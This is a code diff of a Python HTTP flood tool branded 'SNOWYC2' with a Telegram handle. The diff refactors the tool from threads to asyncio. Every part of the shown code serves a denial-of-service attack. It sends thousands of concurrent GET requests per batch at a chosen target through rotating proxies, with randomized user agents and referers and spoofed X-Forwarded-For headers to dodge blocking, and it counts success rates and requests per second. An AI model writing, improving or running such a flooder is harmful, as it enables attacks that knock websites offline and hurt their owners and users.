@@ -2,14 +2,12 @@ import asyncio
 import aiohttp
 import random
 import time
-import threading
 import sys
 import os
 import psutil
-from concurrent.futures import ThreadPoolExecutor
 
+# Config
 MAX_CONCURRENT = 3000
-BOOSTER_THREADS = 300
 REQUEST_TIMEOUT = 10
 
 def load_list(path, fallback=[]):
@@ -19,9 +17,7 @@ def load_list(path, fallback=[]):
     except:
         return fallback
 
-USER_AGENTS = load_list("uas.txt", [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-])
+USER_AGENTS = load_list("uas.txt", ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)"])
 REFERERS = load_list("refs.txt", ["https://www.google.com/"])
 PROXIES = load_list("incognito.txt", [])
 
@@ -37,75 +33,44 @@ class SnowyC2:
             'rps': 0,
             'peak_rps': 0
         }
-        self.start_time = 0
+        self.lock = asyncio.Lock()
         self.process = psutil.Process(os.getpid())
-        self.lock = threading.Lock()
+        self.start_time = 0
 
     def get_proxy(self):
-        if not PROXIES:
-            return None
-        return random.choice(PROXIES)
+        if PROXIES:
+            return f"http://{random.choice(PROXIES)}"
+        return None
 
-    async def make_request(self, session, proxy=None):
+    async def make_request(self, session, proxy):
         headers = {
             "User-Agent": random.choice(USER_AGENTS),
             "Referer": random.choice(REFERERS),
             "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
         }
-        proxy_url = f"http://{proxy}" if proxy else None
         try:
-            async with session.get(self.target, headers=headers, proxy=proxy_url, timeout=REQUEST_TIMEOUT) as resp:
-                with self.lock:
+            async with session.get(self.target, headers=headers, proxy=proxy, timeout=REQUEST_TIMEOUT) as response:
+                async with self.lock:
                     self.stats['total'] += 1
-                    if resp.status == 200:
+                    if response.status == 200:
                         self.stats['success'] += 1
                     else:
                         self.stats['errors'] += 1
         except:
-            with self.lock:
+            async with self.lock:
                 self.stats['total'] += 1
                 self.stats['errors'] += 1
 
-    async def batch_runner(self):
-        conn = aiohttp.TCPConnector(limit_per_host=None)
-        async with aiohttp.ClientSession(connector=conn) as session:
+    async def run_batch(self):
+        connector = aiohttp.TCPConnector(limit_per_host=MAX_CONCURRENT, ssl=False)
+        async with aiohttp.ClientSession(connector=connector) as session:
             while time.time() < self.start_time + self.duration:
                 tasks = [self.make_request(session, self.get_proxy()) for _ in range(MAX_CONCURRENT)]
                 await asyncio.gather(*tasks, return_exceptions=True)
 
-    def booster(self):
-        import requests
-        session = requests.Session()
+    async def display_stats(self):
         while time.time() < self.start_time + self.duration:
-            try:
-                proxy = self.get_proxy()
-                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
-                headers = {
-                    "User-Agent": random.choice(USER_AGENTS),
-                    "Referer": random.choice(REFERERS),
-                    "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
-                }
-                r = session.get(self.target, headers=headers, proxies=proxies, timeout=5)
-                with self.lock:
-                    self.stats['total'] += 1
-                    if r.status_code == 200:
-                        self.stats['success'] += 1
-                    else:
-                        self.stats['errors'] += 1
-            except:
-                with self.lock:
-                    self.stats['total'] += 1
-                    self.stats['errors'] += 1
-
-    def run_boosters(self):
-        for _ in range(BOOSTER_THREADS):
-            t = threading.Thread(target=self.booster)
-            t.daemon = True
-            t.start()
-
-    def print_status_loop(self):
-        while time.time() < self.start_time + self.duration:
-            time.sleep(0.5)
+            await asyncio.sleep(0.5)
             elapsed = time.time() - self.start_time
             remaining = max(0, self.duration - elapsed)
             rps = self.stats['total'] / elapsed if elapsed > 0 else 0
@@ -125,23 +90,15 @@ class SnowyC2:
 
     def start(self):
         self.start_time = time.time()
-        threading.Thread(target=self.print_status_loop, daemon=True).start()
-        self.run_boosters()
-
         try:
-            asyncio.run(self.batch_runner())
+            asyncio.run(self.main())
         except KeyboardInterrupt:
-            print("Stopped.")
+            print("\nStopped by user.")
         except Exception as e:
-            print(f"Error: {e}")
+            print(f"Error: {str(e)}")
 
-        print("\nFINISHED")
-        print("=" * 60)
-        print(f"TOTAL: {self.stats['total']}")
-        print(f"SUCCESS: {self.stats['success']}")
-        print(f"ERRORS: {self.stats['errors']}")
-        print(f"PEAK RPS: {self.stats['peak_rps']:.1f}")
-        print("=" * 60)
+    async def main(self):
+        await asyncio.gather(self.run_batch(), self.display_stats())
 
 def main():
     print("\nSNOWYC2 - T.ME/STSVKINGDOM")
